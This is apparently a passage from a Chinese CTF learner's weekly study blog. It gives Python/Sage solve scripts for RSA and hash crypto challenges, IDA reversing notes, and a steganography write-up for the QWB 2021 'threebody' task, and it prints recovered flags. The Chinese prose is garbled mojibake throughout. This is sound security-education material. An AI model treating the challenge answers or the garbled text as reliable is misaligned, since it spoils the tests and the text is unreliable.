(<span class="number">8</span>, <span class="number">2</span>),</span><br><span class="line"> (<span class="number">9</span>, <span class="number">6</span>),</span><br><span class="line"> (<span class="number">10</span>, <span class="number">2</span>),</span><br><span class="line"> (<span class="number">11</span>, <span class="number">5</span>),</span><br><span class="line"> (<span class="number">12</span>, <span class="number">3</span>),</span><br><span class="line"> (<span class="number">13</span>, <span class="number">11</span>),</span><br><span class="line"> (<span class="number">14</span>, <span class="number">12</span>),</span><br><span class="line"> (<span class="number">15</span>, <span class="number">3</span>),</span><br><span class="line"> (<span class="number">16</span>, <span class="number">12</span>),</span><br><span class="line"> (<span class="number">17</span>, <span class="number">4</span>),</span><br><span class="line"> (<span class="number">18</span>, <span class="number">12</span>),</span><br><span class="line"> (<span class="number">19</span>, <span class="number">12</span>),</span><br><span class="line"> (<span class="number">20</span>, <span class="number">5</span>),</span><br><span class="line"> (<span class="number">21</span>, <span class="number">5</span>),</span><br><span class="line"> (<span class="number">22</span>, <span class="number">6</span>),</span><br><span class="line"> (<span class="number">23</span>, <span class="number">6</span>),</span><br><span class="line"> (<span class="number">24</span>, <span class="number">4</span>),</span><br><span class="line"> (<span class="number">25</span>, <span class="number">7</span>),</span><br><span class="line"> (<span class="number">26</span>, <span class="number">7</span>),</span><br><span class="line"> (<span class="number">27</span>, <span class="number">1</span>)]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(p, _), (q, _), (r, _) = poly.factor_list()</span><br><span class="line"><span class="comment"># å¯¹polyå¤šé¡¹å¼è¿›è¡Œå› å¼åˆ†è§£ï¼Œä½¿å¾—å¾—åˆ°p,q,rå¯¹åº”çš„å¤šé¡¹å¼</span></span><br><span class="line"><span class="comment"># æ­¤æ—¶p,q,rå³ä¸ºx = q1ä»£å…¥åçš„æ•°å€¼</span></span><br><span class="line">p, q, r = p(x = q1), q(x = q1), r(x = q1)</span><br><span class="line"><span class="keyword">assert</span> p*q*r == n2</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ©ç”¨åŸåŠ å¯†å‡½æ•°å¾—åˆ°çœŸå®çš„p1, p, q, r</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p1=next_prime(p1)</span><br><span class="line">    p=next_prime(p)</span><br><span class="line">    q=next_prime(q)</span><br><span class="line">    r=next_prime(r)</span><br><span class="line">    <span class="keyword">if</span> (p-<span class="number">1</span>)%<span class="number">7</span>==<span class="number">0</span> <span class="keyword">and</span> (q-<span class="number">1</span>)%<span class="number">7</span> ==<span class="number">0</span> <span class="keyword">and</span> (r-<span class="number">1</span>)%<span class="number">7</span>==<span class="number">0</span> <span class="keyword">and</span> (p1-<span class="number">1</span>)%<span class="number">7</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è¿™ä¸€æ¨¡å—æ— æ³•è®¡ç®—å‡ºdï¼Œä¸»è¦æ˜¯å› ä¸ºåŸåŠ å¯†å‡½æ•°æ˜¯ç»è¿‡åˆ¤å®šæ‰æœ€ç»ˆè¾“å‡ºçš„ã€‚è€Œåˆ¤å®šä¸º -1 % 7ã€‚</span></span><br><span class="line"><span class="comment"># N = (p1 - 1)*(p1**2) * (p - 1) * (q - 1) * (r - 1)</span></span><br><span class="line"><span class="comment"># d = invert(mpz(e), mpz(N))</span></span><br><span class="line"><span class="comment"># print(d)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å®šä¹‰æ•´æ•°åŸŸæ¨¡pçš„æœªçŸ¥é‡x</span></span><br><span class="line"><span class="comment"># åœ¨påŸŸä¸‹æ±‚è§£æ–¹ç¨‹</span></span><br><span class="line"><span class="comment"># æ ¹ä¸ºå¯èƒ½è§£ï¼Œåˆ©ç”¨long_to_bytes()å¾—åˆ°æœ€ç»ˆflag</span></span><br><span class="line">P.&lt;x&gt; = Zmod(p)[] </span><br><span class="line">f = x^<span class="number">7</span> - c3 </span><br><span class="line">res = f.roots() </span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<h2 id="easy-hash"><a href="#easy-hash" class="headerlink" title="easy_hash"></a>easy_hash</h2><p>æ ¹æ®<code>myhash()</code>å‡½æ•°ï¼Œå› ä¸º$a_0$çš„ä½æ•°å°äº500ä½ï¼Œæ‰€ä»¥$a_0$å°±æ˜¯<code>flag</code>å„ä¸ªéƒ¨åˆ†å’Œå…¶<code>crc32()</code>æ‹¼æ¥åçš„ç»“æœï¼ŒæŠŠcrc32éªŒè¯çš„ç»“æœå»æ‰å°±æ˜¯<code>flag</code>ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P = <span class="number">93327214260434303138080906179883696131283277062733597039773430143631378719403851851296505697016458801222349445773245718371527858795457860775687842513513120173676986599209741174960099561600915819416543039173509037555167973076303047419790245327596338909743308199889740594091849756693219926218111062780849456373</span></span><br><span class="line">a1, secret = (<span class="number">1768672211043417187765307394749760760531160781992300779145800061219666992833602547480090118225665457075744297987672863699370162614965380859290914620736</span>, <span class="number">89139545215288033432210221492974990584987914397112840989583439688211128705545477536596587262069032020212762581490561288493533363888589066045095054475929099275247145877699370608950340925139625068446642116123285918461312297390611577025368805438078034230342490499137494400676347225155752865648820807846513044723</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> crc32</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. åŸåŠ å¯†è„šæœ¬çš„è‡ªå®šä¹‰å‡½æ•°ä¿ç•™ä¸‹æ¥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myhash</span>(<span class="params">x</span>):</span><br><span class="line">    res = []</span><br><span class="line">    end = <span class="string">b&quot;&quot;</span></span><br><span class="line">    bytescipher = long_to_bytes(x)</span><br><span class="line">    a = bytescipher[:<span class="built_in">len</span>(bytescipher) % <span class="number">8</span>]</span><br><span class="line">    res.append(a)</span><br><span class="line">    res.append(long_to_bytes(crc32(a)))</span><br><span class="line">    t = (<span class="built_in">len</span>(bytescipher) // <span class="number">8</span>)</span><br><span class="line">    bytescipher = bytescipher[<span class="built_in">len</span>(bytescipher) % <span class="number">8</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">        a = bytescipher[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">        res.append(a)</span><br><span class="line">        res.append(long_to_bytes(crc32(a)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        end += i</span><br><span class="line">    res = bytes_to_long(end)</span><br><span class="line">    res = (res + (res &gt;&gt; <span class="number">500</span>)) &amp; <span class="number">2</span>**(<span class="number">500</span>) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># def encode(pt):</span></span><br><span class="line"><span class="comment">#     a=[]</span></span><br><span class="line"><span class="comment">#     b=[]</span></span><br><span class="line"><span class="comment">#     a.append(myhash(pt))</span></span><br><span class="line"><span class="comment">#     for i in range(3):</span></span><br><span class="line"><span class="comment">#         a.append(myhash(a[i]))</span></span><br><span class="line"><span class="comment">#     for j in range(4):</span></span><br><span class="line"><span class="comment">#         secret=(a[0] + a[1] * a[j] + a[2] * a[j] ** 2 + a[3] * a[j] ** 3) % P</span></span><br><span class="line"><span class="comment">#         b.append([a[j],secret])</span></span><br><span class="line"><span class="comment">#     return b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(P.bit_length())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. åˆ©ç”¨a1æ¥æ±‚è§£a2, a3</span></span><br><span class="line">a2 = myhash(a1)</span><br><span class="line">a3 = myhash(a2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. a0åˆ©ç”¨secret, a1, a2, a3æ±‚è§£</span></span><br><span class="line">a0 = secret - (a1 * a1 + a2 * a1 ** <span class="number">2</span> + a3 * a1 ** <span class="number">3</span>) % P</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(a0))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. æŠŠcrc32éƒ¨åˆ†å»é™¤ï¼Œå³å¯å¾—åˆ°flag</span></span><br><span class="line"><span class="comment"># b&#x27;DA\xd4\x17\xe9\xf8SCTF&#123;th1\x98\xf8\xa5$s_is_theS\x83\xbf\xc9_fe3st_q\x8f\xa9\xd4\xacuest1on&#125;\x07.B\xce&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;th1s_is_the_fe3st_quest1on&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="references"><a href="#references" class="headerlink" title="references"></a>references</h2><blockquote>
<p>some unread websites</p>
</blockquote>
<p><a href="https://blog.csdn.net/m0_62506844/article/details/124256746">(10æ¡æ¶ˆæ¯) ã€zer0pts CTF 2022ã€‘ Anti-Fermatï¼ˆpã€qç”Ÿæˆä¸å½“)_Paintrainçš„åšå®¢-CSDNåšå®¢_ã€zer0pts ctf 2022ã€‘anti-fermat</a></p>
<p><a href="https://blog.csdn.net/figfig55/article/details/127283671">(10æ¡æ¶ˆæ¯) crypto_solveit2022ï¼ˆrsaä¸­coppersmithæ”»å‡»åº”ç”¨ï¼‰_å±±çŒªå„¿çƒ¦ä¸å¾—çš„åšå®¢-CSDNåšå®¢</a></p>
<p><a href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/README.md">hackergame2020-writeups&#x2F;README.md at master Â· USTC-Hackergame&#x2F;hackergame2020-writeups Â· GitHub</a></p>
<p><a href="https://blog.csdn.net/qq_53283643/article/details/128161307">(10æ¡æ¶ˆæ¯) DASCTF NOV Xè”åˆå‡ºé¢˜äºº2022å¹´åº¦ç§¯åˆ†æ¦œäº‰å¤ºèµ›ï¼Crypto Wp_dasctf nov xè”åˆå‡ºé¢˜äºº2022å¹´åº¦ç§¯åˆ†æ¦œäº‰å¤ºèµ›!_mxx307çš„åšå®¢-CSDNåšå®¢</a></p>
<p><a href="http://www.axiom-developer.org/axiom-website/download.html">Axiom Computer Algebra System (axiom-developer.org)</a></p>
<h1 id="230214"><a href="#230214" class="headerlink" title="230214"></a>230214</h1><h2 id="çª—å£ç¨‹åºé€†å‘æ€ç»´"><a href="#çª—å£ç¨‹åºé€†å‘æ€ç»´" class="headerlink" title="çª—å£ç¨‹åºé€†å‘æ€ç»´"></a>çª—å£ç¨‹åºé€†å‘æ€ç»´</h2><blockquote>
<p>ä»¥Test_A_Windowsä¸ºä¾‹</p>
</blockquote>
<ul>
<li><p>ä¸»ç¨‹åºå…¥æ‰‹</p>
</li>
<li><p>APIå…¥æ‰‹</p>
</li>
</ul>
<ol>
<li>ç›´æ¥<code>Shift + F12</code>ï¼Œæ‰“å¼€stringç•Œé¢ï¼Œç„¶åæŸ¥çœ‹å…³é”®å­—ç¬¦ä¸²ã€‚<em>æœ¬ç¨‹åºæ— æ³•çœ‹åˆ°å…³é”®å­—ç¬¦ä¸²ï¼Œå¯èƒ½ç»è¿‡äº†ç¼–ç è½¬æ¢ã€‚</em></li>
<li>æŸ¥çœ‹APIè°ƒç”¨ã€‚<ol>
<li>è¯»å–çš„çª—ä½“ä¸­çš„å­—ç¬¦ä¸²ï¼Œä¸€èˆ¬è°ƒç”¨äº†<code>GetWindowsText</code></li>
<li>å¼¹çª—ï¼Œä¸€èˆ¬è°ƒç”¨äº†<code>MessageBox</code></li>
<li>åé¢çš„<code>A</code>è¡¨ç¤ºä½¿ç”¨çš„ç¼–ç å½¢å¼ï¼ŒASCII</li>
<li>æŒ‰<code>x</code>æŸ¥çœ‹è°ƒç”¨æƒ…å†µï¼Œå‰å¾€åœ°å€</li>
<li>çº¢è‰²æ—¶ï¼Œæ— æ³•æŒ‰<code>F5</code>ï¼Œæ­¤æ—¶IDAå¹¶æœªè¯†åˆ«</li>
<li>å®šä½ï¼Œç„¶å<code>Create Function</code>ï¼Œå†<code>F5</code>æ‰‹åŠ¨åˆ›å»ºå‡½æ•°</li>
<li>ä¸­é—´æ¶‰åŠåˆ°<code>strcmp</code>ï¼Œè·Ÿ<strong>å†…è”ä¼˜åŒ–</strong>ç»“åˆèµ·æ¥ï¼Œæ­¤æ—¶éœ€è¦å¯¹<strong>æ•°æ®çš„æ¥æº</strong>è¿›è¡ŒæŸ¥çœ‹</li>
<li>æŒ‰<code>A</code>ç›´æ¥æ•°å€¼è½¬åŒ–</li>
</ol>
</li>
<li><code>Test_A2.exe</code>ä¸»è¦å‡ºç°é—®é¢˜ï¼š<em>ç²—è™šçº¿ä¸ºå†…è”ä¼˜åŒ–</em></li>
</ol>
<img src="/2023/12/31/WeeklyStudy/image-20230214160444620.png" class="" title="å†…è”ä¼˜åŒ–">

<ul>
<li><em>ecxæ‹¿å–1å­—èŠ‚æ”¾åˆ°dlä¸­</em> &lt;â€“ è¾“å…¥çš„å­—ç¬¦ä¸²</li>
<li><em>eaxæ‹¿å–1å­—èŠ‚æ”¾åˆ°dlä¸­</em> &lt;â€“ åŸå­˜å‚¨å­—ç¬¦ä¸²</li>
<li><em>dlä¸dlè¿›è¡Œæ¯”è¾ƒ</em></li>
<li>ä¸€èˆ¬2å­—èŠ‚è¿›è¡Œä¸€æ¬¡æ¯”è¾ƒï¼Œç„¶åè¿›è¡Œå¾ªç¯ï¼Œå…·ä½“çŸ¥è¯†ç‚¹çœ‹OneNote</li>
</ul>
<ol start="4">
<li>ç„¶åçœŸå®éœ€è¦çš„å¯†é’¥å°±åœ¨å†…è”ä¼˜åŒ–çš„ä¸Šé¢ï¼Œç¨å¾®æ‰¾ä¸€ä¸‹ã€‚</li>
</ol>
<img src="/2023/12/31/WeeklyStudy/image-20230301111926826.png" class="" title="çœŸå®å¯†é’¥">

<ul>
<li>å»åŸå­˜å‚¨çš„åœ°æ–¹è¿›è¡Œè½¬æ¢ä¸€ä¸‹å³å¯ï¼Œ<code>A</code></li>
</ul>
<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>å†…éƒ¨çš„ç¨‹åºåˆ†æï¼Œåˆ†æè¿‡ç¨‹è¿›è¡Œæ•´ç†ã€‚</p>
<h1 id="230215"><a href="#230215" class="headerlink" title="230215"></a>230215</h1><h2 id="decode"><a href="#decode" class="headerlink" title="decode"></a>decode</h2><blockquote>
<p>å¤å…¸å¯†ç å­¦ç»¼åˆã€‚</p>
<p>ç›´æ¥çœ‹cipheyæ„Ÿè§‰æ›´ç›´æ¥ã€‚</p>
</blockquote>
<ol>
<li>å‡¯æ’’13</li>
<li>base16&#x2F;16è¿›åˆ¶è½¬æ¢</li>
<li>base64</li>
<li>cipheyç›´æ¥å¾—å‡º</li>
</ol>
<img src="/2023/12/31/WeeklyStudy/image-20230216103912113.png" class="" title="ciphey">

<h2 id="ï¼"><a href="#ï¼" class="headerlink" title="ï¼"></a>ï¼</h2><ul>
<li>CakeRSA</li>
<li>é€†å‘</li>
</ul>
<h1 id="230216"><a href="#230216" class="headerlink" title="230216"></a>230216</h1><h2 id="å­¦ä¹ å¿ƒå¾—"><a href="#å­¦ä¹ å¿ƒå¾—" class="headerlink" title="å­¦ä¹ å¿ƒå¾—"></a>å­¦ä¹ å¿ƒå¾—</h2><h3 id="å­¦ä¹ ç¬”è®°çš„ç¼–å†™"><a href="#å­¦ä¹ ç¬”è®°çš„ç¼–å†™" class="headerlink" title="å­¦ä¹ ç¬”è®°çš„ç¼–å†™"></a>å­¦ä¹ ç¬”è®°çš„ç¼–å†™</h3><ul>
<li>æ¯å‘¨å­¦ä¹ æƒ…å†µçš„æ±‡æ€»ï¼Œæœ‰å¤§è‡´äº†è§£</li>
<li>çŸ¥è¯†ç‚¹å›é¡¾ï¼Œå®¹æ˜“å®šä½</li>
<li>æœ‰äº›é—®é¢˜ï¼Œå½“æ—¶æ˜¯é—ç•™é—®é¢˜ï¼Œåé¢å¯èƒ½åˆèƒ½è§£å†³äº†</li>
</ul>
<h3 id="å¯†ç å­¦çš„æ•°å­¦æ¨å¯¼"><a href="#å¯†ç å­¦çš„æ•°å­¦æ¨å¯¼" class="headerlink" title="å¯†ç å­¦çš„æ•°å­¦æ¨å¯¼"></a>å¯†ç å­¦çš„æ•°å­¦æ¨å¯¼</h3><ul>
<li>dpå˜ç§<ul>
<li>æ‰©å±•1ï¼š$n \equiv p^{b} \cdot q $</li>
</ul>
</li>
<li>ç¾ŠåŸæ¯Power<ul>
<li>dpæ‰©å±•</li>
<li>æ•°å­¦æ¨å¯¼ï¼Œå…³é”®å…¬å¼</li>
</ul>
</li>
<li>æ‹Ÿæ€çš„å†å¤ç°<ul>
<li>å¤šé¡¹å¼é—®é¢˜ -&gt; å¤šå…ƒæ–¹ç¨‹ç»„é—®é¢˜</li>
<li>æ•°å­¦æ¨å¯¼</li>
</ul>
</li>
</ul>
<p>-&gt; æ•°å­¦æ¨å¯¼ï¼šè´¹é©¬å°å®šç†ï¼Œç®€åŒ–æœ¬æ¥æ¯”è¾ƒå¤æ‚çš„ç­‰å¼ã€‚</p>
<p>-&gt; å¤šé¡¹å¼ç›¸å…³</p>
<h3 id="é€†å‘ç›¸å…³åŸºç¡€ä»¥åŠå·¥å…·è¿ç”¨"><a href="#é€†å‘ç›¸å…³åŸºç¡€ä»¥åŠå·¥å…·è¿ç”¨" class="headerlink" title="é€†å‘ç›¸å…³åŸºç¡€ä»¥åŠå·¥å…·è¿ç”¨"></a>é€†å‘ç›¸å…³åŸºç¡€ä»¥åŠå·¥å…·è¿ç”¨</h3><blockquote>
<p>ä¸»è¦è¿˜æ˜¯éœ€è¦æŠŠåŸºç¡€çŸ¥è¯†ç‚¹åº”ç”¨å®é™…ã€‚</p>
</blockquote>
<ul>
<li>å‰æç¯å¢ƒæ­å»º</li>
<li>ç®€å•é€†å‘é¢˜ç›®å¤ç°</li>
<li>ç»“åˆå†…è”ä¼˜åŒ–åçš„é¢˜ç›®<ul>
<li>TEST_A2</li>
</ul>
</li>
<li>å¶ç„¶çœ‹åˆ°çš„ç»“åˆå¯†ç å­¦ç®—æ³•çš„é€†å‘é¢˜ç›®<ul>
<li>é€†å‘è€ƒæŸ¥éš¾é¢˜ï¼Œå®¹æ˜“è·Ÿå¯†ç å­¦è¿›è¡Œç»“åˆ</li>
<li>é€†å‘éœ€è¦æŠŠå˜é‡&#x2F;æ•°æ®çš„å˜åŒ–è¿‡ç¨‹äº†è§£</li>
</ul>
</li>
</ul>
<p>-&gt; Cè¯­è¨€ä»¥åŠå¤šåˆ†æ</p>
<p>-&gt; é€†å‘æŠ€æœ¯å­¦ä¹ è®ºå›ï¼šçœ‹é›ª&#x2F;å¾çˆ±ç ´è§£ï¼ˆå·¥å…·åŒ…ï¼‰</p>
<h3 id="é—ç•™é—®é¢˜-1"><a href="#é—ç•™é—®é¢˜-1" class="headerlink" title="é—ç•™é—®é¢˜"></a>é—ç•™é—®é¢˜</h3><ul>
<li>ä¸€äº›dockeré¶åœºç¯å¢ƒæ— æ³•è¿è¡Œç­‰ -&gt; <em>æ˜å¤©è¯•ä¸‹dockerçœ‹èƒ½ä¸èƒ½ç›´æ¥è¿è¡Œ</em></li>
<li>VSCODEï¼Œå¦‚ä½•ç¼–è¯‘å‡º32ä½ç¨‹åºæ–‡ä»¶</li>
<li>å¤šé¡¹å¼ç›¸å…³å®šç†å­¦ä¹ </li>
</ul>
<h1 id="230217"><a href="#230217" class="headerlink" title="230217"></a>230217</h1><h2 id="åˆ†äº«åçš„é—ç•™é—®é¢˜è§£å†³"><a href="#åˆ†äº«åçš„é—ç•™é—®é¢˜è§£å†³" class="headerlink" title="åˆ†äº«åçš„é—ç•™é—®é¢˜è§£å†³"></a>åˆ†äº«åçš„é—ç•™é—®é¢˜è§£å†³</h2><ol>
<li>dockeråœ¨å°è¯•ä¸­</li>
<li>VSCodeï¼Œå¦‚ä½•ç¼–è¯‘å‡º32ä½ç¨‹åºæ–‡ä»¶ä»å¾…è§£å†³<ol>
<li>å¯æ›¿ä»£æ–¹æ¡ˆï¼šä½¿ç”¨VSé€‰æ‹©debuggerè¿›è¡Œ</li>
</ol>
</li>
<li>å¤šé¡¹å¼å®šç†ï¼Œä¸‹å‘¨ç©ºäº†æ•´å§</li>
</ol>
<h2 id="sqlmapé‡å®‰è£…"><a href="#sqlmapé‡å®‰è£…" class="headerlink" title="sqlmapé‡å®‰è£…"></a>sqlmapé‡å®‰è£…</h2><ul>
<li>æŠ¥é”™äº†ä¸€å †é—®é¢˜ï¼Œæ„Ÿè§‰æ˜¯ç”¨çš„æºæœ‰é—®é¢˜ï¼Œå…ˆå‡†å¤‡é‡æ–°å®‰è£…äº†</li>
<li>æ¥æ¥å›å›æ•´æ´»<code>apt-get</code>æ›´æ–°ï¼Œå›æ»šé”™è¯¯ï¼Œéº»çˆªäº†</li>
<li>äº‹å®è¯æ˜è¿˜æ˜¯å¾—è®°å¾—æ‰“ä¸ªå¿«ç…§ï¼Œkaliå½»åº•ç©å´©äº†ã€‚æˆ‘å»ã€‚</li>
<li>win7çš„çˆ¶å¿«ç…§è¢«æˆ‘åˆ æ²¡äº†ï¼Œç¯å¢ƒå´©äº†ã€‚</li>
</ul>
<p><em>ä¿©ç¯å¢ƒéƒ½åºŸäº†ï¼Œè‡ªé—­äº†ï¼Œæ¯ç­å§ä¸–ç•Œã€‚</em></p>
<h2 id="qwb-2021-misc-threebody"><a href="#qwb-2021-misc-threebody" class="headerlink" title="[qwb-2021-misc]threebody"></a>[qwb-2021-misc]threebody</h2><blockquote>
<p><a href="https://www.anquanke.com/post/id/244533">ç”¨å›¾ç‰‡è®²ä¸€ä¸ªæ•…äº‹â€”â€”ç¬¬äº”å±Šå¼ºç½‘æ¯Threebodyé¢˜ç›®å®˜æ–¹é¢˜è§£-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>
</blockquote>
<h3 id="stegsolveæŸ¥çœ‹å‘ç°å›¾ç‰‡"><a href="#stegsolveæŸ¥çœ‹å‘ç°å›¾ç‰‡" class="headerlink" title="stegsolveæŸ¥çœ‹å‘ç°å›¾ç‰‡"></a>stegsolveæŸ¥çœ‹å‘ç°å›¾ç‰‡</h3><p>ä½ ä»¬éƒ½æ˜¯è™«å­ã€‚</p>
<h3 id="æ”¾å¤§å‘ç°åƒç´ ç‚¹æ•°"><a href="#æ”¾å¤§å‘ç°åƒç´ ç‚¹æ•°" class="headerlink" title="æ”¾å¤§å‘ç°åƒç´ ç‚¹æ•°"></a>æ”¾å¤§å‘ç°åƒç´ ç‚¹æ•°</h3><p>ç›¸é‚»åƒç´ ç‚¹æ•°å€¼ç›¸å·®è¾ƒå¤§ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230308100114529.png" class="" title="image-20230308100114529">

<p>ä»”ç»†è§‚å¯Ÿå‘ç°å¦‚æœä»¥4ä¸ºå‘¨æœŸç›¸å·®åƒç´ ç‚¹æ•°å€¼å°†ç›¸å·®ä¸å¤§ã€‚ -&gt; ä¿®æ”¹åƒç´ ç‚¹æ‰€å æ¯”ç‰¹æ•°<code>biBitCount 24 -&gt; 32</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230308094743609.png" class="" title="image-20230308094743609">

<p>å¾—åˆ°çœŸå®å›¾ç‰‡ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/threebody_output.bmp" class="" title="true threebody">

<h3 id="å†ä½¿ç”¨solvesolveè¿›è¡Œåˆ†æ"><a href="#å†ä½¿ç”¨solvesolveè¿›è¡Œåˆ†æ" class="headerlink" title="å†ä½¿ç”¨solvesolveè¿›è¡Œåˆ†æ"></a>å†ä½¿ç”¨solvesolveè¿›è¡Œåˆ†æ</h3><img src="/2023/12/31/WeeklyStudy/image-20230215130857823.png" class="">

<p><code>stegsolve</code>è¿›è¡Œæå–ã€‚è¡Œåˆ—éƒ½å­˜åœ¨éšå†™æ•°æ®ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/steg1.png" class="" title="row">

<img src="/2023/12/31/WeeklyStudy/steg2.png" class="">

<p>å¯å¾—æç¤º<code>å¸Œå°”ä¼¯ç‰¹æ›²çº¿</code></p>
<h3 id="å†—ä½™æ•°æ®èµ‹å€¼"><a href="#å†—ä½™æ•°æ®èµ‹å€¼" class="headerlink" title="å†—ä½™æ•°æ®èµ‹å€¼"></a>å†—ä½™æ•°æ®èµ‹å€¼</h3><p>è§‚å¯Ÿå›¾ç‰‡å‘ç°å­˜åœ¨<code>rgbReserved</code>çš„å­—æ®µï¼Œè¡¨ç¤º<code>stegsolve</code>è¿˜å­˜åœ¨æ— æ³•è¯†åˆ«çš„é€šé“ã€‚</p>
<p>ä¸¤ç§æ–¹æ³•ã€‚</p>
<ul>
<li><code>bmp</code>è½¬åŒ–æˆ<code>png</code></li>
<li><code>blue</code>é€šé“è·Ÿ<code>Reserved</code>é€šé“å¤§å°ç›¸è¿‘ï¼Œç›´æ¥æš´åŠ›èµ‹å€¼</li>
</ul>
<h4 id="bmpè½¬åŒ–æˆpng"><a href="#bmpè½¬åŒ–æˆpng" class="headerlink" title="bmpè½¬åŒ–æˆpng"></a>bmpè½¬åŒ–æˆpng</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">image=Image.new(mode=<span class="string">&#x27;RGBA&#x27;</span>,size=(<span class="number">580</span>,<span class="number">435</span>))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;threebody.bmp&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file=f.read()</span><br><span class="line">    index=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">434</span>,-<span class="number">1</span>,-<span class="number">1</span>):  <span class="comment">#æ ¹æ®bmpçš„ç»“æ„çŸ¥é“è¯¥bmpæ–‡ä»¶ä¸Šä¸‹å€’åºå­˜å‚¨åƒç´ å€¼</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">580</span>):</span><br><span class="line">            s=[]</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">                s.append(file[index])</span><br><span class="line">                index+=<span class="number">1</span></span><br><span class="line">            image.putpixel((j,i),(s[<span class="number">2</span>],s[<span class="number">1</span>],s[<span class="number">0</span>],s[<span class="number">3</span>]))  <span class="comment">#</span></span><br><span class="line">    image.show()</span><br><span class="line">    image.save(<span class="string">&#x27;threebody_new.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="æš´åŠ›èµ‹å€¼"><a href="#æš´åŠ›èµ‹å€¼" class="headerlink" title="æš´åŠ›èµ‹å€¼"></a>æš´åŠ›èµ‹å€¼</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;threebody.bmp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    d = f.read()</span><br><span class="line"></span><br><span class="line">w = <span class="number">580</span></span><br><span class="line">h = <span class="number">435</span></span><br><span class="line">b = <span class="number">4</span></span><br><span class="line">l = <span class="built_in">bytearray</span>(d)</span><br><span class="line">off = l[<span class="number">10</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        l[off+j*b+i*b*w] = l[off+j*b+i*b*w+<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;threebody_new.bmp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(l)</span><br></pre></td></tr></table></figure>

<h3 id="å¸Œå°”ä¼¯ç‰¹æ›²çº¿"><a href="#å¸Œå°”ä¼¯ç‰¹æ›²çº¿" class="headerlink" title="å¸Œå°”ä¼¯ç‰¹æ›²çº¿"></a>å¸Œå°”ä¼¯ç‰¹æ›²çº¿</h3><blockquote>
<p>reference: <a href="https://mp.weixin.qq.com/s/IOSGOJnGyiGoD8J1ITQJlg">çœŸÂ·é™ç»´æ‰“å‡»ï¼ã€Šä¸‰ä½“ã€‹ä¸­äºŒå‘ç®”åå™¬åœ°çƒçš„åœºæ™¯æˆçœŸäº†ï¼è¿™ä½Bç«™Upä¸»è¿‡äºç¡¬æ ¸â€¦â€¦ (qq.com)</a></p>
</blockquote>
